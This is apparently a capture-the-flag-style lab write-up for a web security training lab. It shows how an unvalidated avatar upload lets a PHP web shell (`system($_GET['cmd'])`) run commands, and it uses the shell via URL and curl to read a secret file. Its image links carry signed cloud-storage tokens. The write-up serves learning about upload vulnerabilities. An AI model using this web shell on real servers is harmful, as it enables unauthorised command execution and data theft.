# Remote code execution via web shell upload

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`

### Analysis/Exploitation -

Login as user `wiener`:

**In the lab’s background, it said:**

> This lab contains a vulnerable image upload function. It doesn’t perform any validation on the files users upload before storing them on the server’s filesystem.

Now, If the application doesn’t do any validation on user’s file upload, an attack could upload a web shell to the web server’s filesystem!

**But before we do that, let’s upload a normal file, and intercept the request via Burp Suite:**

When we clicked the `Upload` button, a POST request will be sent to `/my-account/avatar`, with parameters `name='user'`& `name='csrf'` at end after image data.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/198510e0-dccb-4a69-84aa-c4636e8207cf/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466URTFTN4U%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210414Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBJWOh%2BvCDNJUJzu2KZP9wIfKIvVx2wMlMjG0DVvIabWAiBpxj7fYxpakoOuiH45ur6xdyqAydv%2BeHEcXALSGyEEVCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMV%2B1lX75LYn8zEB6CKtwDxy5jfxwHqH%2Bc2g5NF5t7huq%2FRl3oVP3L8bkz95zG2KEipd2krt1wEYP%2FDAg4jS5%2FLSXWyAiZBaVoBc91muLJdcv6jZ2m%2B%2F5cqYY31tObw1IG7aAr0hFhzPiGSK1J%2BKRjtgAk%2FldkvGgEnR0UI8H91ovZAAbyZC2gWC5yAc6FijcfMTelRz0kFZQ%2FqJ%2BTp8m3%2BlUEse33rri%2BADGOJonV%2FvoCHFqBxVhYyYARDiPxHVA5xa07Csl2CxK%2BLPq2%2BbF7wL5fDfoKVmr7AFERA8hBKhrebrI1AnKtuluMiA%2BoINiyon%2F5HzJq9ukABxXbEwInCtX%2ByaLIwCrQlyFCLH%2F3JQE8hqMhzVtdr0wUS2q4drkE9uK5AIOQVYV9W8cDEHMSIWByVxsIbVvFokCpCNxfLdRTPqECQxlSf%2FOZD91tZRoy1w1E%2FIZIPHo5LcRTw9NUnBpUciOWO1p9f81xEq38w5oi6JJlHjT9pJYWmOXYiQTB809iRk5qsSxjClkisu%2BlWA02YqVCIi3rG%2BKTuxZ4UeaxGV9IELG4M1t%2BuIXhDTGzcPR6EyH9FClvwbhl2xaapa8i3%2BjbdB6J6p3GAupd3wM2G4MLLM354rVV4l0nDoO5oyMvZp%2BYYYq3URgwhsai1AY6pgE6LarfFK4m1IkaWQAxUN0mXj3oOENDfxY8GCu3Mngulr%2BpiKq4%2FxHXrGnJMp1rLr5JNofhAWnL0EYjcd3eAn2S09vFGFPds6j3vTKvhEU%2FEyxZfZW1XFDZisHYAH1T2xfs9uhx2o4%2BKPPQDs%2Bluru%2FdrvuSCo%2BNofT48SIBk52Cj6v97YAQMdftlCHdG0rCYXKcQyhREYixeANdEdWmlq1UxjYIxMC&X-Amz-Signature=e7a7f3f23049746d1a83d4f6756068ee2285d9dcf7a1232b56f1b46e2ecfc031&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

when we click “Back to My Account”, notice that image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cde8a822-35f5-47fc-9b42-f886f39b12b4/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466URTFTN4U%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210414Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBJWOh%2BvCDNJUJzu2KZP9wIfKIvVx2wMlMjG0DVvIabWAiBpxj7fYxpakoOuiH45ur6xdyqAydv%2BeHEcXALSGyEEVCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMV%2B1lX75LYn8zEB6CKtwDxy5jfxwHqH%2Bc2g5NF5t7huq%2FRl3oVP3L8bkz95zG2KEipd2krt1wEYP%2FDAg4jS5%2FLSXWyAiZBaVoBc91muLJdcv6jZ2m%2B%2F5cqYY31tObw1IG7aAr0hFhzPiGSK1J%2BKRjtgAk%2FldkvGgEnR0UI8H91ovZAAbyZC2gWC5yAc6FijcfMTelRz0kFZQ%2FqJ%2BTp8m3%2BlUEse33rri%2BADGOJonV%2FvoCHFqBxVhYyYARDiPxHVA5xa07Csl2CxK%2BLPq2%2BbF7wL5fDfoKVmr7AFERA8hBKhrebrI1AnKtuluMiA%2BoINiyon%2F5HzJq9ukABxXbEwInCtX%2ByaLIwCrQlyFCLH%2F3JQE8hqMhzVtdr0wUS2q4drkE9uK5AIOQVYV9W8cDEHMSIWByVxsIbVvFokCpCNxfLdRTPqECQxlSf%2FOZD91tZRoy1w1E%2FIZIPHo5LcRTw9NUnBpUciOWO1p9f81xEq38w5oi6JJlHjT9pJYWmOXYiQTB809iRk5qsSxjClkisu%2BlWA02YqVCIi3rG%2BKTuxZ4UeaxGV9IELG4M1t%2BuIXhDTGzcPR6EyH9FClvwbhl2xaapa8i3%2BjbdB6J6p3GAupd3wM2G4MLLM354rVV4l0nDoO5oyMvZp%2BYYYq3URgwhsai1AY6pgE6LarfFK4m1IkaWQAxUN0mXj3oOENDfxY8GCu3Mngulr%2BpiKq4%2FxHXrGnJMp1rLr5JNofhAWnL0EYjcd3eAn2S09vFGFPds6j3vTKvhEU%2FEyxZfZW1XFDZisHYAH1T2xfs9uhx2o4%2BKPPQDs%2Bluru%2FdrvuSCo%2BNofT48SIBk52Cj6v97YAQMdftlCHdG0rCYXKcQyhREYixeANdEdWmlq1UxjYIxMC&X-Amz-Signature=564a134039666710b66873bbc19b365d4b0b91cb907100c99e73964b4cd5330f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/05c4efad-f9bd-4978-bd13-a5d5925b051b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466URTFTN4U%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210414Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBJWOh%2BvCDNJUJzu2KZP9wIfKIvVx2wMlMjG0DVvIabWAiBpxj7fYxpakoOuiH45ur6xdyqAydv%2BeHEcXALSGyEEVCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMV%2B1lX75LYn8zEB6CKtwDxy5jfxwHqH%2Bc2g5NF5t7huq%2FRl3oVP3L8bkz95zG2KEipd2krt1wEYP%2FDAg4jS5%2FLSXWyAiZBaVoBc91muLJdcv6jZ2m%2B%2F5cqYY31tObw1IG7aAr0hFhzPiGSK1J%2BKRjtgAk%2FldkvGgEnR0UI8H91ovZAAbyZC2gWC5yAc6FijcfMTelRz0kFZQ%2FqJ%2BTp8m3%2BlUEse33rri%2BADGOJonV%2FvoCHFqBxVhYyYARDiPxHVA5xa07Csl2CxK%2BLPq2%2BbF7wL5fDfoKVmr7AFERA8hBKhrebrI1AnKtuluMiA%2BoINiyon%2F5HzJq9ukABxXbEwInCtX%2ByaLIwCrQlyFCLH%2F3JQE8hqMhzVtdr0wUS2q4drkE9uK5AIOQVYV9W8cDEHMSIWByVxsIbVvFokCpCNxfLdRTPqECQxlSf%2FOZD91tZRoy1w1E%2FIZIPHo5LcRTw9NUnBpUciOWO1p9f81xEq38w5oi6JJlHjT9pJYWmOXYiQTB809iRk5qsSxjClkisu%2BlWA02YqVCIi3rG%2BKTuxZ4UeaxGV9IELG4M1t%2BuIXhDTGzcPR6EyH9FClvwbhl2xaapa8i3%2BjbdB6J6p3GAupd3wM2G4MLLM354rVV4l0nDoO5oyMvZp%2BYYYq3URgwhsai1AY6pgE6LarfFK4m1IkaWQAxUN0mXj3oOENDfxY8GCu3Mngulr%2BpiKq4%2FxHXrGnJMp1rLr5JNofhAWnL0EYjcd3eAn2S09vFGFPds6j3vTKvhEU%2FEyxZfZW1XFDZisHYAH1T2xfs9uhx2o4%2BKPPQDs%2Bluru%2FdrvuSCo%2BNofT48SIBk52Cj6v97YAQMdftlCHdG0rCYXKcQyhREYixeANdEdWmlq1UxjYIxMC&X-Amz-Signature=72e9794118f281349b9f97638124e60d9c5d9ddb511e38f46b600e27fbfe6a23&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Now we know **the exact location of the uploaded file: **`/files/avatars/test.png`**.**

Try to upload PHP web shell

**Payload:**`<?php system($_GET['cmd']); ?>`

> 💡 **<?php system($_GET['cmd']); ?>**
$**_GET** Can collect data that was sent in the URL or submitted in an HTML form.
The command to be executed is obtained from the user's input via the $_GET superglobal array. In this case, the user is expected to pass the command as a query parameter named 'cmd' in the URL.

For example, if the script is hosted at example.com/shell.php, a user could execute a command by visiting:
**http://example.com/shell.php?cmd=ls%20-l**

Use the avatar upload function to upload malicious PHP file

Calling the file will output the content of the secret file:

```text
https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php/?cmd=cat%20/home/carlos/secret
```


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/fa72d605-48e2-4df2-b706-c8dbcaacd18d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466URTFTN4U%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210414Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBJWOh%2BvCDNJUJzu2KZP9wIfKIvVx2wMlMjG0DVvIabWAiBpxj7fYxpakoOuiH45ur6xdyqAydv%2BeHEcXALSGyEEVCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMV%2B1lX75LYn8zEB6CKtwDxy5jfxwHqH%2Bc2g5NF5t7huq%2FRl3oVP3L8bkz95zG2KEipd2krt1wEYP%2FDAg4jS5%2FLSXWyAiZBaVoBc91muLJdcv6jZ2m%2B%2F5cqYY31tObw1IG7aAr0hFhzPiGSK1J%2BKRjtgAk%2FldkvGgEnR0UI8H91ovZAAbyZC2gWC5yAc6FijcfMTelRz0kFZQ%2FqJ%2BTp8m3%2BlUEse33rri%2BADGOJonV%2FvoCHFqBxVhYyYARDiPxHVA5xa07Csl2CxK%2BLPq2%2BbF7wL5fDfoKVmr7AFERA8hBKhrebrI1AnKtuluMiA%2BoINiyon%2F5HzJq9ukABxXbEwInCtX%2ByaLIwCrQlyFCLH%2F3JQE8hqMhzVtdr0wUS2q4drkE9uK5AIOQVYV9W8cDEHMSIWByVxsIbVvFokCpCNxfLdRTPqECQxlSf%2FOZD91tZRoy1w1E%2FIZIPHo5LcRTw9NUnBpUciOWO1p9f81xEq38w5oi6JJlHjT9pJYWmOXYiQTB809iRk5qsSxjClkisu%2BlWA02YqVCIi3rG%2BKTuxZ4UeaxGV9IELG4M1t%2BuIXhDTGzcPR6EyH9FClvwbhl2xaapa8i3%2BjbdB6J6p3GAupd3wM2G4MLLM354rVV4l0nDoO5oyMvZp%2BYYYq3URgwhsai1AY6pgE6LarfFK4m1IkaWQAxUN0mXj3oOENDfxY8GCu3Mngulr%2BpiKq4%2FxHXrGnJMp1rLr5JNofhAWnL0EYjcd3eAn2S09vFGFPds6j3vTKvhEU%2FEyxZfZW1XFDZisHYAH1T2xfs9uhx2o4%2BKPPQDs%2Bluru%2FdrvuSCo%2BNofT48SIBk52Cj6v97YAQMdftlCHdG0rCYXKcQyhREYixeANdEdWmlq1UxjYIxMC&X-Amz-Signature=7cd9e58093b5c8f3c9c20ad2fc435f42ac78528aad6784f333cc292aaf51bc1d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

via command line using curl

```bash
curl https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/47af05bc-20ed-4450-980e-c8b7d176fdda/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466URTFTN4U%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210414Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBJWOh%2BvCDNJUJzu2KZP9wIfKIvVx2wMlMjG0DVvIabWAiBpxj7fYxpakoOuiH45ur6xdyqAydv%2BeHEcXALSGyEEVCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMV%2B1lX75LYn8zEB6CKtwDxy5jfxwHqH%2Bc2g5NF5t7huq%2FRl3oVP3L8bkz95zG2KEipd2krt1wEYP%2FDAg4jS5%2FLSXWyAiZBaVoBc91muLJdcv6jZ2m%2B%2F5cqYY31tObw1IG7aAr0hFhzPiGSK1J%2BKRjtgAk%2FldkvGgEnR0UI8H91ovZAAbyZC2gWC5yAc6FijcfMTelRz0kFZQ%2FqJ%2BTp8m3%2BlUEse33rri%2BADGOJonV%2FvoCHFqBxVhYyYARDiPxHVA5xa07Csl2CxK%2BLPq2%2BbF7wL5fDfoKVmr7AFERA8hBKhrebrI1AnKtuluMiA%2BoINiyon%2F5HzJq9ukABxXbEwInCtX%2ByaLIwCrQlyFCLH%2F3JQE8hqMhzVtdr0wUS2q4drkE9uK5AIOQVYV9W8cDEHMSIWByVxsIbVvFokCpCNxfLdRTPqECQxlSf%2FOZD91tZRoy1w1E%2FIZIPHo5LcRTw9NUnBpUciOWO1p9f81xEq38w5oi6JJlHjT9pJYWmOXYiQTB809iRk5qsSxjClkisu%2BlWA02YqVCIi3rG%2BKTuxZ4UeaxGV9IELG4M1t%2BuIXhDTGzcPR6EyH9FClvwbhl2xaapa8i3%2BjbdB6J6p3GAupd3wM2G4MLLM354rVV4l0nDoO5oyMvZp%2BYYYq3URgwhsai1AY6pgE6LarfFK4m1IkaWQAxUN0mXj3oOENDfxY8GCu3Mngulr%2BpiKq4%2FxHXrGnJMp1rLr5JNofhAWnL0EYjcd3eAn2S09vFGFPds6j3vTKvhEU%2FEyxZfZW1XFDZisHYAH1T2xfs9uhx2o4%2BKPPQDs%2Bluru%2FdrvuSCo%2BNofT48SIBk52Cj6v97YAQMdftlCHdG0rCYXKcQyhREYixeANdEdWmlq1UxjYIxMC&X-Amz-Signature=0755e87f2875ecbcebfeb25d0a1f0ab1f186fb92a7621d83407a72bfa55f7ca7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

